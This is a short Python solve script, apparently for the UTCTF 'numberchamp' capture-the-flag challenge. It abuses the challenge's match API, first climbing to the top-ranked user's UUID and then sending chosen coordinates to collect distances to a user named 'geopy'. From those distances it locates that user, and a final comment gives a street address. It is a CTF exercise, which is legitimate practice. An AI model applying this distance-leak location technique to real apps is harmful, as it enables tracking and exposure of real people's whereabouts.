#!/usr/bin/env python
#UTCTF

import requests
import random

url = "https://numberchamp-challenge.utctf.live"
uuid = "0dd4919d-0141-464d-8108-d857ee9f7ba5"
currentELO = 0

while(currentELO < 3000):
    postURL = url + "/match?uuid=" + uuid + "&lat=0&lon=0"
    response = requests.post(postURL)
    response_data = response.json()  # Parse JSON response
    bufferELO = response_data.get("elo", "0")
    if(bufferELO > currentELO):
        currentELO = bufferELO
        uuid = response_data.get("uuid", uuid)
        print("user: " + uuid + ". ELO: " + str(currentELO))
print()
print("Champion = " + uuid + ". ELO: " + str(currentELO))
print()

locations = 3
for i in range(locations):
    lat = random.randint(-90, 90)
    lon = random.randint(-179, 180)
    postURL = url + "/match?uuid=" + uuid + "&lat=" + str(lat) + "&lon=" + str(lon)
    response = requests.post(postURL)
    #print(response.text)
    response_data = response.json()  # Parse JSON response
    if (response_data.get("user", "0") == "geopy"):
        distance = response_data.get("distance", "0")
        print("Lat = " + str(lat) + ". Lon = " + str(lon))
        print("Distance = " + str(distance))
    else:
        print("Not geopy")
    print()

#1059 S High St, Columbus, OH 43206, USA

